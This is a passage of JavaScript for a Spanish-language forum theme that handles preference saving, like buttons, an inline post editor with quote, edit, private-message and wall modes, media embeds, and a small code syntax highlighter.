                    profilemsgs: $('.pref_tres').find(':checked').val(),
                    newsletter: $('.pref_seis').find(':checked').val(),
                    hideonline: $('.pref_siete').find(':checked').val(),
                    notifyreply: $('.pref_ocho').find(':checked').val(),
                    allow_mass_pm: $('.pref_nueve').find(':checked').val(),
                    popup_pm: $('.pref_once').find(':checked').val(),
                    post_prevent: $('.pref_doce').find(':checked').val(),
                    no_report_popup: $('.pref_trece').find(':checked').val(),
                    attachsig: $('.pref_catorce').find(':checked').val(),
                    allowbbcode: $('.pref_quince').find(':checked').val(),
                    allowhtml: $('.pref_dseis').find(':checked').val(),
                    allowsmilies: $('.pref_dsiete').find(':checked').val(),
                    language: $('.pref_docho').find(':checked').val(),
                    timezone: $('.pref_dnueve').find(':checked').val(),
                    dateformat: $('.pref_veinte').find(':checked').val(),
                    username: ops.mi_nombre,
                    email: document.forms.post.email.value,
                    page_profil: 'preferences',
                    mode: 'editprofile',
                    user_id: ops.mi_id,
                    current_email: document.forms.post.email.value,
                    submit: 1
                }).success(function () {
                    console.log('Ok: preferencias cambiadas correctamente');
                    ops.notify(ops.mi_nombre + ' modificaste correctamente tus preferencias')
                })
            })
        },
        r_iN: function () {
            var a = $.getby('.estadisticas');
            ops.add_ind();
            ops.loadwall();
            a[0].innerHTML += ops.estadisticas;
            localStorage.staffOn && localStorage.staffOn.indexOf('/u') > 0 && localStorage.staffEx > +new Date - 4 * 60 * 1000 ? ($.getby('#theStaff').innerHTML = localStorage.staffOn, ops.aTsF_()) : ops.l_aXs_();
        },
        act_up: ind && $.getby('#actividad_update'),
        ind_b: ind && $.getby('.index-box'),
        log_i: ind && $.getby('.log-in')[0],
        tot_u: ind && $.getby('.totaluser')[0],
        logout: $.getby('#logout'),
        estadisticas: !pu && estadisticas,
        textarea: (ps || tm) && $.getby('#editor-textarea'),
        subject: tm && $.getby('#editor-subject'),
        mode: tm && $.getby('#editor-mode').getElementsByTagName('span')[1],
        editor: tm && $.getby('#ze-editor'),
        send_button: (ps || tm) && $.getby('#editor-send-button'),
        mp_info: tm && $.getby('.mp-msg'),
        notice: tm && $.getby('.notice')[0],
        download: tm && $.getby('.descargar'),
        content: tm && $.getby('.content')[0],
        author: tm && $.getby('.author'),
        postprofile_dom: tm && $.getby('.postprofile'),
        ze_upload: tm && $.getby('#ze-upload'),
        ze_newtab: (ps || tm) && $.getby('#newtab'),
        mode_button: tm && $.getby('.mode-button')[0],
        modbar: tm && $.getby('.modbar')[0],
        maincontent: $.getby('#main-content'),
        pathbox: tm && $.getby('.pathname-box'),
        t_Tm: function () {
            ops.preview_dom = '.content';
            ops.button(ops.button_dom);
            ops.e_Sf();
            ops.logout && (ops.mD_Tl());
            ops.p_a();
            ops.l_dom_ready = !0;
            ops.i_Lk();
            ops.me_L();
            ops.BaN_O();
            ops.p_LPt();
            !ops.soy_staff && (ops.modbar.style.display = 'none');
            ops.maincontent.style = 'display:block;opacity:1';
            ops.pathbox[0].style = 'display:block;opacity:1';
            ops.pathbox[1].style = 'display:block;opacity:1';
        },
        l_callback: function (e, t) {
            $('span.corners-top', e.parentNode.parentNode).after(t)
        },
        like: function (e, t) {
            var o = t.innerHTML;
            t.innerHTML = ops.lang.loadlike,
                t.onclick = '#', $.get(e, function () {
                    t.className += ' novote', t.innerHTML = o;
                    var e = t.nextSibling,
                        a = parseInt(/\d+/.exec(e.innerHTML)[0]) + 1,
                        A = e.textContent.match(/[A-Za-z]+.*/g)[0];
                    e.textContent = e.textContent.replace(A, ' Me gusta');
                    e.innerHTML = e.innerHTML.replace(/\d+/, a);
                    ops.Li_Sp(t)
                })
        },
        Li_Sp: function (d) {
            var e = d.parentNode.parentNode.parentNode,
                o = ops.mi_nombre,
                a = e.id.match(/\d+/g)[0],
                t = $.getby('#p' + a).getElementsByTagName('strong')[1].textContent;
            console.log(a + ' ' + ' ' + t + ' ' + o + ' ' + e);
            ops.Nacti_msg = 'A ' + o + ' le gusta el post #' + a + ' de ' + t + ' en el tema:[url=' + document.location.href + ']' + ops.topic_name + '#' + a + ' [/url]', ops.Na(), ops.Na_user = 'Likes', ops.Na()
        },
        i_Lk: function () {
            for (var o, e = $('.vote'), t = 0; o = e[t++];) {
                var i = 0,
                    n = $('.vote-bar', o)[0],
                    s = $('.vote-button', o)[0];
                if (n) {
                    var r = n.title.match(/\d+/g);
                    i = Math.round(parseInt(r[1]) * parseInt(r[0])) / 100
                }
                s = s ? '<span onclick="ops.like(\'' + s.firstChild.href + '\',this);" class="like">' + ops.lang.l_icon + ops.lang.l_vote_singular + '</span>' : '<span class="like novote">' + ops.lang.l_icon + ' </span>';
                var l = '<span class="likecount">A ' + i + ' ' + (1 === i ? ops.lang.l_vote_singular : ops.lang.l_vote_plural) + '</span>',
                    p = '<div class="vote" style="margin:3px;width: 238px!important;">' + s + l + '</div>';
                ops.l_callback && ops.l_callback(o, p)
            }
            e.remove()
        },
        me_L: function () {
            var t, s, e = document.querySelectorAll('.novote + .likecount');
            for (var o = 0; o < e.length; o++) t = e[o].textContent.match(/\d+/g),
                s = e[o].parentNode.parentNode.parentNode.classList.contains('me'), 1 != t || s ? 2 != t || s ? t > 2 && !s ? e[o].textContent = 'A mi y a ' + t + ' nos gusta el post' : 1 == t && s ? e[o].textContent = 'A un usuario le gusta mi post' : 2 == t && s ? e[o].textContent = 'A mi y a otro usuario les gusta mi post' : t > 2 && s && (e[o].textContent = 'A ' + t + ' les gusta mi post') : e[o].textContent = 'A mi y a otro usuario nos gusta el post' : e[o].textContent = 'Me gusta este post'
        },
        newtab_start: function (e, o) {
            ops.ze_newtab = $.getby('#newtab');
            if ('none' === $(ops.ze_newtab).css('display')) {
                switch (ops.ze_newtab.classList.remove('tinypic', 'awesome', 'youtube_frame', 'facebook_frame', 'emoticons'), e) {
                case 'tinypic':
                    ops.newtab_f(o, -163, 46, 450, 200, e), ops.tinypic();
                    break;
                case 'awesome':
                    ops.newtab_f(o, -13, 46, 377, 226, e), ops.fawesome();
                    break;
                case 'youtube_frame':
                    ops.newtab_f(o, -53, 10, 200, 70, e), ops.youtube();
                    break;
                case 'facebook_frame':
                    ops.newtab_f(o, -53, 10, 200, 70, e), ops.f_video();
                    break;
                case 'emoticons':
                    ops.newtab_f(o, -13, 46, 377, 225, e), ops.createSmilies();
                    break;
                case 'url':
                    ops.newtab_f(o, 0, 46, 149, 226, e), ops.bburl()
                }
                ops.ze_newtab.style.display = 'block';
            } else(ops.ze_newtab.style.display = 'none', ops.ze_newtab.classList.remove('tinypic', 'awesome', 'youtube_frame', 'facebook_frame', 'emoticons'))
        },
        newtab_f: function (o, a, t, w, h, e) {
            var L = o.offsetLeft + a,
                T = o.offsetTop + t;
            ops.ze_newtab.style = 'z-index:999;position:absolute;left:' + L + 'px;top:' + T + 'px;width:' + w + 'px;height:' + h + 'px';
            ops.ze_newtab.classList.add(e)
        },
        tinypic: function () {
            var H = '<p class="anun_pic"><img src="http://i.imgur.com/JC2m40bh.png">Selecciona las imagenes</p><br/><iframe id="frame_imgur" src="/h25-imgur" style="padding-bottom:0;border:none;margin-top: -8px; margin-left: -8px;height: 243px;" frameborder="1" scrolling="si" width="463px"></iframe>';
            ops.ze_newtab.hasChildNodes('iframe') == false && (ops.ze_newtab.innerHTML = H)
        },
        bburl: function () {
            var d = '<div class="dropdown insertlink"><div><label >URL</label><input type="text" id="linksrc" class="url" placeholder="http://" value=""></div><div><label>Descripción (Opcional)</label><input type="text" id="linktitle" value=""></div><div><input type="button" class="button_url" value="Insertar"></div></div>';
            ops.ze_newtab.innerHTML = d;
            var a = $.getby('#linksrc'),
                b = $.getby('#linktitle'),
                c = $.getby('.button_url')[0],
                d = document.forms.post.message;
            c.onclick = function () {
                if (a.value.indexOf('http://') > -1) {
                    if (b.value != '') {
                        d.value += '[url=' + a.value + ']' + b.value + '[/url]';
                        ops.ze_newtab.style.display = 'none';
                        d.focus()
                    } else {
                        d.value += '[url]' + a.value + '[/url]';
                        ops.ze_newtab.style.display = 'none';
                        d.focus()
                    }
                } else {
                    return false
                }
            }
        },
        createSmilies: function () {
            ops.ze_newtab.innerHTML = '<center><i style="color:rgb(0, 0, 0);font-size:32px;margin-top:30%"class="fa fa-spinner fa-spin"></i></center>';
            $.get('/h6-smilies').success(function (a) {
                ops.ze_newtab.firstChild.outerHTML = a;
                var e = $.getby('#emoticons').getElementsByTagName('img');
                for (var i = 0; i < e.length; i++) {
                    e[i].onclick = function () {
                        ops.textarea.value += ' ' + this.alt, ops.textarea.focus()
                    }
                }
            })
        },
        fawesome: function () {
            ops.ze_newtab.innerHTML = '<center style="margin-top:10%"><i style="color:rgb(0, 0, 0);font-size:32px"class="fa fa-spinner fa-spin"></i></center>';
            $.get('/h18-emoji').success(function (a) {
                ops.ze_newtab.firstChild.outerHTML = a;
                var e = $.getby('.car_esp');
                for (var i = 0; i < e.length; i++) {
                    e[i].setAttribute('alt', e[i].textContent);
                    e[i].innerHTML = '&' + e[i].textContent;
                    e[i].setAttribute('onclick', 'ops.click_ce(this)');
                };
                var w = $.getby('.aW');
                for (var t = 0; t < w.length; t++) {
                    w[t].setAttribute('onclick', 'ops.click_aw(this)');
                }
            });
        },
        click_aw: function (c) {
            ops.textarea.value += ' [aW]' + c.innerHTML + '[/aW]', ops.textarea.focus()
        },
        click_ce: function (c) {
            ops.textarea.value += ' [Cesp]' + c.getAttribute('alt') + '[/Cesp]', ops.textarea.focus()
        },
        youtube: function () {
            var H = '<div class="dropdown youtube"><div><label>Youtube URL:</label><input class="url_youtube" placeholder="http://" type="text"></div><input class="button_youtube" value="Insertar" type="button"></div>';
            ops.ze_newtab.innerHTML = H;
            $.getby('.button_youtube')[0].onclick = function () {
                var y = $.getby('.url_youtube')[0].value.match(/(?:v=|v\/|embed\/|youtu.be\/)(.{11})/)[1];
                $.getby('.url_youtube')[0].value = '';
                ops.textarea.value += '[youtube]' + y + '[/youtube]\n';
                ops.ze_newtab.style = 'display:none'
            };
        },
        f_video: function () {
            var H = '<div class="facebook_video"><div><label>Facebook video URL:</label><input class="facebook_url" placeholder="http://" type="text"></div><input class="facebook_button" value="Insertar" type="button"></div>';
            ops.ze_newtab.innerHTML = H;
            $.getby('.facebook_button')[0].onclick = function () {
                var a = $.getby('.facebook_url')[0].value.match(/[^https\:\/\/www\.facebook\.com].*/g);
                $.getby('.facebook_url')[0].value = '';
                ops.textarea.value += '[facebook_video]/' + a + '[/facebook_video]\n';
                ops.ze_newtab.style = 'display:none'
            };
        },
        f_code: function () {
            (function (d, s, id) {
                var js, fjs = d.getElementsByTagName(s)[0];
                if (d.getElementById(id)) return;
                js = d.createElement(s);
                js.id = id;
                js.src = "//connect.facebook.net/es_LA/sdk.js#xfbml=1&version=v2.3";
                fjs.parentNode.insertBefore(js, fjs);
            }(document, 'script', 'facebook-jssdk'));
        },
        vig_init: function () {
            var e = $.getby('a');
            if (e)
                for (var t = 0; t < e.length; t++) /\?unwatch=topic/gi.test(e[t].href) === !0 && (e[t].innerHTML = ops.lang.unwatchBTN, e[t].className = 'tnvig-tem', e[t].setAttribute('onclick', 'ops.vG_lr(this);return false')), /\?watch=topic/gi.test(e[t].href) === !0 && (e[t].innerHTML = ops.lang.watchBTN, e[t].className = 'tvig-tem', e[t].setAttribute('onclick', 'ops.vG_lr(this);return false')), $.getby('.watchnowatch')[0].style.display += 'inline';
        },
        vG_lr: function (c) {
            var t = c.href;
            $.post(t, {
                confirm: 1
            }).success(function () {
                if (c.innerHTML = ops.lang.watchBTN) {
                    ops.Nacti_msg = ops.mi_nombre + ' esta vigilando el tema: [url=' + window.location.href + ']' + ops.topic_name + '[/url]', ops.Na_user = 'Historial';
                    ops.Na();
                    c.innerHTML = ops.lang.unwatchBTN
                    c.href = document.location.pathname + '?unwatch=topic'
                } else if (c.innerHTML = ops.lang.unwatchBTN) {
                    ops.Nacti_msg = ops.mi_nombre + ' dejo de vigilar tema: [url=' + window.location.href + ']' + ops.topic_name + '[/url]';
                    ops.Na_user = 'Historial';
                    ops.Na();
                    c.innerHTML = ops.lang.watchBTN;
                    c.href = document.location.pathname + '?watch=topic'
                }
            })
        },
        BaN_O: function () {
            var e = $.getby('.ban'),
                f = ' El autor de este mensaje ha sido baneado del foro',
                g = '<div class="fa_alert"><i class="fa fa-exclamation-triangle"></i>' + f + '</div>',
                h = '<i class="fa fa-exclamation-triangle" style="margin-bottom: -3px; margin-top: 2px; color: yellow;"></i> Baneado',
                i = 'Usuario baneado';
            if (e) {
                for (var t = 0; t < e.length; t++) {
                    var a = e[t].nextSibling,
                        b = a.getElementsByTagName('strong'),
                        c = a.getElementsByClassName('content'),
                        d = a.getElementsByClassName('nombre-tema');
                    a.style.display = 'block';
                    a.classList.add('baneado');
                    b[0].title = i;
                    b[1].title = i; //<--loop
                    b[0].onclick = '';
                    b[1].onclick = '';
                    c[0].insertAdjacentHTML('afterbegin', g);
                    d[0].children[0].innerHTML = h;
                }
            }
        },
        cancel: function () {
            var a = $.getby('.long_post');
            $(ops.editor).slideUp();
            ops.ze_newtab.style.display = 'none';
            a.length && (a[0].style.height = '400px');
            $('html,body').scrollTop($(ops.editor).closest('.post').find('.postNumberContainer').offset().top)
            window.onbeforeunload = !1;
            ops.back_close();
        },
        copy: function () {
            $('dl.codebox').length >= 1 && $.getScript('//cdnjs.cloudflare.com/ajax/libs/clipboard.js/1.5.5/clipboard.min.js').done(function () {
                $(function ($) {
                    var $code = $("code");
                    if ($code.length) {
                        function fallbackMessage(action) {
                            var actionMsg = '';
                            var actionKey = (action === 'cut' ? 'X' : 'C');
                            if (/iPhone|iPad/i.test(navigator.userAgent)) {
                                actionMsg = 'No support!';
                            } else if (/Mac/i.test(navigator.userAgent)) {
                                actionMsg = 'Press ⌘-' + actionKey + ' to ' + action;
                            } else {
                                actionMsg = 'Press Ctrl-' + actionKey + ' to ' + action;
                            }
                            return actionMsg;
                        }
                        function afterClipboard(ele) {
                            setTimeout(function () {
                                ele.className = 'fa fa-clipboard';
                            }, 1400);
                        }
                        var snippets = document.querySelectorAll('.codebox:not(.spoiler) > dd');
                        [].forEach.call(snippets, function (snippet) {
                            snippet.firstChild.insertAdjacentHTML('beforebegin', '<i style="color:#385379; margin-left: 11px; margin-top: 5px; cursor: pointer;display: initial;"class="fa fa-clipboard" data-clipboard><b style="font-family:monda"> Copiar código</b></i>  ');
                        });
                        var clipboardSnippets = new Clipboard('[data-clipboard]', {
                            target: function (trigger) {
                                return trigger.nextElementSibling;
                            }
                        });
                        clipboardSnippets.on('success', function (e) {
                            e.clearSelection();
                            e.trigger.className = 'fa fa-check-square-o';
                            afterClipboard(e.trigger);
                        });
                        clipboardSnippets.on('error', function (e) {
                            e.trigger.className = 'fa fa-exclamation-circle';
                            afterClipboard(e.trigger);
                            alert(fallbackMessage(e.action));
                        });
                    }
                });
            })
        },
        panda: function () {
            function a(z, w) {
                return w ? z.replace(/\r?\n/g, '<br/>') : z.replace(/\<br\s?\/?\>/gi, '\n')
            }
            function t(z, w) {
                return '<span clapanda="' + z + '">' + w + "</span>"
            }
            function v(z, A, w) {
                return z.replace(RegExp('\\b(?:' + A.join('|') + ')\\b', 'g'), function (B) {
                    return t(w, B)
                })
            }
            function u(z, A, w) {
                for (var B in A) {
                    w = w.replace(A[B], function (C) {
                        return t(z + '-' + B, C)
                    })
                }
                return w
            }
            var s = {
                cacheIdentity: !0,
                installedLanguages: [],
                languages: {},
                regex: {
                    comment1: /\/\/[^\n]*/g,
                    comment2: /\/\*(.|[\n\r])*?\*\//gm,
                    comment3: /#[^\n]*/g,
                    string: /(['"])(?:\\?.)*?\1/g,
                    operators: /[!=\+%\*\-][!=\+\-]?|&(?:amp;){2}|&gt;|&lt;|(?:\|\|)/g,
                    extra: /[:\{\}\[\]\(\)]/g
                },
                parse: function (E, X) {
                    var D = s.languages[E];
                    if (!D) {
                        return X
                    }
                    var B = D.matchers,
                        V = D.keywords,
                        F = D.specials,
                        A = (new Date).getTime(),
                        C = {};
                    X = a(X).replace(/\</g, '&lt;').replace(/>/g, '&gt;').replace(/&nbsp;/g, '');
                    for (var U = 0, R = 0, Y; Y = B[U++];) {
                        var W = this.regex[Y],
                            z = '\u00a3panda_' + Y + '_' + A + '_',
                            T = C[Y] = {},
                            Q = !1;
                        W && (W.inner && (Q = W.inner, W = W.outer), X = X.replace(W, function (G) {
                            var w = z + R++ + '_' + (W.multiline ? 'm_' : '') + 'panda\u00a3';
                            Q && (G = u('panda-' + Y, Q, G));
                            T[w] = G;
                            return w
                        }))
                    }
                    V.length && (X = v(X, V, 'panda-keyword'));
                    F.length && (X = v(X, F, 'panda-special'));
                    D.noints || (X = X.replace(/\b\d+(?:\.\d+)?\b/g, function (w) {
                        return t('panda-int', w)
                    }));
                    for (U = B.length; U; U--) {
                        Y = B[U - 1];
                        var D = C[Y],
                            S;
                        for (S in D) {
                            V = D[S], S.indexOf('_m_') && (V = V.replace(/\n/g, '</span>\n<span clapanda="panda-' + Y + '">')), X = X.replace(S, t('panda-' + Y, V))
                        }
                    }
                    X = X.split(' ').join('&nbsp;').replace(/&nbsp;clapanda=/g, " class=").replace(/\t/g, "&nbsp;&nbsp;&nbsp;&nbsp;");
                    return a('<ol><li class="panda-line">' + X.split(/\n/).join('</li><li class="panda-line">') + '</li></ol>', 1)
                },
                identify: function (z) {
                    if (z.pandaType) {
                        return z.pandaType
                    }
                    var w = /(?:\s|^)panda[_-](\w+)(?:\s|$)/;
                    return w.test(z.className) ? w.exec(z.className)[1] : 'default'
                },
                colorNode: function (z) {
                    var w = s.identify(z);
                    s.cacheIdentity && (z.pandaType = w);
                    z.className += ' panda-code panda-' + w;
                    z.innerHTML = s.parse(w, z.innerHTML)
                },
                addSpecials: function (z, w) {
                    this.addKeywords(z, w, !0)
                },
                addKeywords: function (z, A, w) {
                    if (z in s) {
                        for (var C = 0, B = A.length; C < B; C++) {
                            s.languages[z][w ? 'specials' : 'keywords'].push(A[C])
                        }
                    }
                },
                addLang: function (z, A) {
                    if ('matchers' in A) {
                        var w = s.languages[z] = {};
                        s.installedLanguages.push(z);
                        w.matchers = 'string' === typeof A.matchers ? A.matchers.split(' ') : A.matchers;
                        w.specials = ('string' === typeof A.specials ? A.specials.split(' ') : A.specials) || [];
                        w.keywords = ('string' === typeof A.keywords ? A.keywords.split(' ') : A.keywords) || [];
                        if (A.regex && 'object' === typeof A.regex) {
                            for (var B in A.regex) {
                                s.regex[B] = A.regex[B]
                            }
                        }
                    }
                }
            };
            window.panda = s;
            s.addLang('default', {
                matchers: ['string'],
                keywords: 'var for while if else elseif function def class try catch return true false continue break case default delete switch in as null typeof sizeof null int char bool boolean long double float enum import struct signed unsigned',
                specials: ['document']
            });
            s.onload = function () {
                for (var z = document.getElementsByTagName('code'), A = 0, w; w = z[A++];) {
                    s.colorNode(w)
                }
            }
            panda.onload = function () {
                var a = ['default', 'dark', 'deepsea', 'bright', 'neon', 'desert', 'plain', 'geany', 'github'],
                    t = document.getElementsByTagName('code'),
                    A = my_getcookie('panda-theme'),
                    z = '<option value="null"> -------------- </option>';
                for (var w = 0, v;
                    (v = a[w++]);) {
                    z += '<option value="' + v + '" ' + (A && A === v ? ' selected="selected"' : "") + ">";
                    z += v.charAt(0).toUpperCase() + v.substr(1) + "</option>"
                }
                for (var u = 0, B;
                    (B = t[u++]);) {
                    panda.colorNode(B);
                    var aHtml = '<div class="cabecera"><i class="fa fa-code" style="float:left;line-height:1.2;margin-left:5px;color:rgb(255, 140, 0);font-size:20px;"></i><span class="selec" onClick="ops.selectCode(this)" class="ops.selectCode" style="cursor:pointer;float:left;line-height:2;color:rgb(255, 255, 255);margin-left:5px;font-size:12px;font-family:monda;">Seleccionar el contenido</span><span class="panda-theme-select" style="color:rgb(255, 255, 255);font-size:12px;font-family:monda;"> Tema: <select onchange="ops.set_panda_theme(this.value)">' + z + '</select></span></div>';
                    var Aa = B.parentNode.parentNode.innerHTML;
                    B.parentNode.parentNode.innerHTML = aHtml + Aa;
                }
                if (A) {
                    ops.set_panda_theme(A, t)
                }
            };
            $(panda.onload);
        },
        set_panda_theme: function (u, s) {
            s = s || $.getby('code');
            for (var t = 0, a;
                (a = s[t++]);) {
                a.className = a.className.replace(/\s?panda-theme-\w+\s?/, '') + ' panda-theme-' + u
            }
            my_setcookie('panda-theme', u, 1)
        },
        selectCode: function (e) {
            if (e = 'B' === e.parentNode.tagName ? $(e).closest('table').find('.cont_code')[0] : $(e).closest('dl').find('code')[0], window.getSelection) {
                var t = window.getSelection();
                if (t.setBaseAndExtent) t.setBaseAndExtent(e, 0, e, e.innerText.length - 1);
                else {
                    window.opera && '<BR>' === e.innerHTML.substring(e.innerHTML.length - 4) && (e.innerHTML += ' ');
                    var o = document.createRange();
                    o.selectNodeContents(e), t.removeAllRanges(), t.addRange(o)
                }
            } else document.getSelection ? (t = document.getSelection(), o = document.createRange(), o.selectNodeContents(e), t.removeAllRanges(), t.addRange(o)) : document.selection && (o = document.body.createTextRange(), o.moveToElementText(e), o.select())
        },
        quote: function (c) {
            ops.loading(true);
            $.get(c.href, function (t) {
                ops.textarea.value += $('#editor-textarea', t)[0].value.replace(/]/, '][quotelink="' + location.pathname + '#' + c.href.match(/[0-9]+/g)[1] + '"]\n');
                $('html,body').scrollTop($(ops.editor).offset().top);
                ops.textarea.focus();
                ops.loading(false)
            })
        },
        edit: function (c) {
            ops.loading(true);
            ops.url = c.href;
            '' !== ops.textarea.value ? $.boxes({
                mode: 'confirm',
                title: ops.mi_nombre + ' de continuar perderas lo escrito',
                ok: function () {
                    $.get(ops.url, function (c) {
                        ops.textarea.value = $('#editor-textarea', c)[0].value;
                        ops.subject.value = $('.titulo_del_post', c)[0].value;
                        $('html,body').animate({
                            scrollTop: $(ops.textarea).offset().top - 100
                        }, 200);
                        ops.textarea.focus();
                        ops.loading(false)
                    })
                },
                cancel: function () {
                    ops.textarea.focus(), ops.loading(false)
                }
            }) : $.get(ops.url, function (c) {
                ops.textarea.value = $('#editor-textarea', c)[0].value, ops.subject.value = $('.titulo_del_post', c)[0].value, ops.textarea.focus(), ops.loading(false)
            })
        },
        pm: function (c) {
            var t = ops.nombre_editor,
                d = ops.lang.pm_message_title + ' ' + ops.topic_name,
                f = ops.textarea.value,
                g = '/privmsg?mode=post&post=1',
                h = 'inbox',
                i = 'post',
                j = ' tu mensaje privado se envió con éxito',
                k = 'Send';
            t.length > 0 ? ops.post_mw(t, d, f, g, i, j, h, k, '') : $.boxes('alert', ops.lang.pm_message_error)
        },
        wall: function (c) {
            var t = ops.nombre_editor,
                d = ops.lang.wall_message_title + ' ' + ops.topic_name,
                f = ops.textarea.value,
                g = '/privmsg',
                h = 'profile',
                i = 'post_profile',
                j = ' tu mensaje al muro se envió con éxito',
                k = '1';
            t.length > 0 ? ops.post_mw(t, d, f, g, i, j, h, k, '') : $.boxes('alert', ops.lang.pm_message_error)
        },
        post_mw: function (t, d, f, g, i, j, h, k, z) {
            $.post(g, {
                username: t,
                folder: h,
                mode: i,
                post: k,
                message: f,
                subject: d,
                usergroup: z
            }).done(function () {
                (ops.mode.textContent === 'Modo: Mensaje Privado' || ops.mode.textContent === 'Modo: Muro') && (ops.textarea.value = '', $(ops.editor).slideUp()), ops.textarea.placeholder = ops.mi_nombre + j, ops.notify(j)
            })
        },
        button: function (c) {
            var a, b, c, d, e = $.getby(c),
                g = $.getby('img'),
                h = $.getby('a');
            if (ops.logout) {
                for (var t = 0; t < e.length; t++) {
                    a = e[t].getElementsByClassName('i_icon_pm');
                    b = e[t].getElementsByClassName('i_icon_profile');
                    c = e[t].getElementsByClassName('postprofile')[0];
                    d = c.getElementsByClassName('i_icon_profile');
                    a[0].parentNode.setAttribute('onclick', 'ops.start(\'pm\', this);return false');
                    a[0].outerHTML = '<p class=mp style="display:inline;">MP</p>';
                    b[0].outerHTML = '<p class="perfil" style="display:inline;">Perfil</p>';
                    d[0].outerHTML = '<p class="perfil" style="display:inline;">Perfil</p>'
                }
            }
            for (var t = 0; t < g.length; t++) {
                /\/icon_contact_www\.gif/g.test(g[t].src) != false && (g[t].outerHTML = '<p class="www" style="display:inline;">web</p>');
            }
            for (var t = 0; t < h.length; t++) {
                /\=email\&u/g.test(h[t].href) != false && (h[t].children[0].outerHTML = '<p class=email style="display:inline;">Email</p>');
            }
            ops.me();
            ops.b_me_()
        },
        b_me_: function () {
            for (var b = $.getby('.post'), t = 0; t < b.length; t++) {
                var u = b[t].getElementsByClassName('editar'),
                    v = b[t].getElementsByClassName('delete'),
                    w = b[t].getElementsByClassName('quote'),
                    x = b[t].getElementsByClassName('post_wall'),
                    y = b[t].getElementsByClassName('ip'),
                    z = b[t].getElementsByClassName('buttons_zeditor');
                ops.soy_user && ops.estoy_logueado ? b[t].classList.contains('me') || (u.length && u[0].remove(), v.length && v[0].remove(), y.length && y[0].remove()) : ops.estoy_logueado || (u.length && u[0].remove(), v.length && v[0].remove(), w.length && w[0].remove(), y.length && y[0].remove(), x.length && x[0].remove(), z.length && z[0].remove())
            }
        },
        innerHTML_save: function () {
            'Guardar' === ops.send_button.innerHTML && (ops.send_button.innerHTML = 'Enviar')
        },
        f_Fp: function (d, c) {
            var a, b, f, g, h, i, e = $.getby('.post');
            for (var t = 0; t < e.length; t++) {
                if (e[t].classList.contains('p_activo')) {
                    e[t].classList.remove('p_activo');
                }
            }
            $(c).closest('.post').addClass('p_activo');
            a = $.getby('.p_activo')[0],
                b = a.getElementsByClassName('zeditor-message')[0],
                f = a.getElementsByClassName('author')[0].children[1].textContent,
                g = a.getElementsByClassName('nombre-tema')[0].children[0].href,
                h = 'Editor de texto, ¿tienes dudas de su uso?, pregunta...',
                i = 'Recuerda que para ver los códigos debes tener mínimo 6 comentarios...';
            ops.message_dom = b;
            ops.nombre_editor = f;
            ops.url_tema = g;
            _userdata.user_posts >= 6 ? ops.notice.innerHTML = h : ops.notice.innerHTML = i;
            ops.textarea.focus();
            ops.editor.classList.add('active-editor');
            ops.editor.classList.remove('edit-mode', 'quote-mode', 'pm-mode', 'wall-mode', 'reply-mode', 'maxim');
            $(ops.editor).insertAfter(ops.message_dom).slideDown();
            ops.back(), ops.Me_Mo(), ops.b_UnL()
        },
        start: function (d, c, e) {
            switch (ops.f_Fp(d, c), d) {
            case 'reply':
                ops.offset_post(), ops.editor.classList.add('reply-mode'), ops.url = e, ops.mode.innerHTML = ops.lang.reply, ops.textarea.placeholder = ops.mi_nombre + ' escribe un comentario...', '' !== ops.textarea.value && (ops.notice.innerHTML = ops.mi_nombre + ' si deseas publicar tu mensaje presiona ENVIAR', ops.send_button.style.background = 'rgba(255, 215, 0, 1)'), ops.innerHTML_save(), ops.mp_info[0].style.display = 'none', ops.L_p(d);
                break;
            case 'wall':
                var o = ops.nombre_editor;
                ops.notice.innerHTML = 'Vas a enviar un mensaje al muro de ' + o, ops.editor.classList.add('wall-mode'), ops.innerHTML_save(), ops.url = !1, ops.mode.innerHTML = 'Modo: Muro', ops.textarea.placeholder = ops.mi_nombre + ' envia un mensaje al muro de ' + o, ops.offset_post(), ops.mp_info[0].style.display = 'none';
                break;
            case 'quote':
                ops.offset_post(), ops.url = c.href, ops.quote(c), ops.notice.innerHTML = 'Estas citando un comentario, si deseas citar a alguien más repite la operación, de lo contrario presiona enviar', ops.editor.classList.add('quote-mode'), ops.mode.innerHTML = ops.lang.quote, ops.innerHTML_save(), ops.mp_info[0].style.display = 'none', ops.L_p(d);
                break;
            case 'edit':
                ops.edit(c), ops.notice.innerHTML = 'Estas en el modo edición', ops.editor.classList.add('edit-mode'), ops.mode.innerHTML = ops.lang.edit, ops.send_button.innerHTML = 'Guardar', ops.offset_post(), ops.mp_info[0].style.display = 'none';
                break;
            case 'pm':
                ops.mode.innerHTML = ops.lang.pm, ops.notice.innerHTML = 'Vas a enviar un mensaje privado', ops.editor.classList.add('pm-mode'), ops.innerHTML_save(), ops.url = !1, ops.textarea.placeholder = ops.mi_nombre + ' redacta tu mensaje privado...';
                var a = ops.nombre_editor;
                ops.mp_info[0].style.display = 'block', ops.mp_info[0].innerHTML = 'Mensaje para:<p style="color:rgba(0, 0, 139, 1);font-weight:bolder;display:inline;font-size:11px">' + a + '</p>', ops.offset_post();
                break;
            }
        },
        post: function (c) {
            var e, a = $.getby('.titulo-tema')[0].getAttribute('url'),
                b = ops.textarea,
                d = ' <i class="fa fa-spinner fa-pulse fa-1x fa-fw"></i>',
                f = ops.lang.error_message,
                t = 'Tu mensaje ha sido publicado con éxito',
                g = ops.lang.pm,
                h = ops.lang.flood_message,
                i = ops.send_button,
                j = ops.mode;
            j.innerHTML === ops.lang.quote && (ops.url = a), ops.url ? 0 === b.value ? $.boxes('alert', ops.lang.no_message) : (i.innerHTML += d, $.post(ops.url, {
                post: 'Send',
                message: b.value,
                subject: ops.subject.value,
                notify: '1'
            }, function (c) {
                e = c.indexOf(t), c.indexOf('El control del flood') > 0 ? $.boxes('alert', h) : c.indexOf('Un nuevo mensaje') > 0 ? $.post('/post', $('form.ps', c).serialize() + '&post=1', function (c) {
                    e < 0 ? $.boxes('alert', f) : ops.newPost($('a[href*="viewtopic"]', c)[0].href)
                }) : (e < 0 ? $.boxes('alert', f) : ops.newPost($('a[href*="viewtopic"]', c)[0].href))
            })) : j.innerHTML == g ? ops.pm(c) : ops.wall(c)
        },
        newPost: function (c) {
            var a, f, b, d, e, h, j, i, k, l, m, n, t = c.split('#')[1],
                g = $.getby('.zeditor-new');
            g.length && g[0].classList.remove('zeditor-new');
            ops.editor.classList.remove('maxim');
            $(ops.editor).slideUp();
            ops.send_button.innerHTML = ops.lang.send_button;
            if (ops.mode.innerHTML === ops.lang.reply || ops.mode.innerHTML === ops.lang.quote) {
                $.get(c, function (c) {
                    a = $('#p' + t, c);
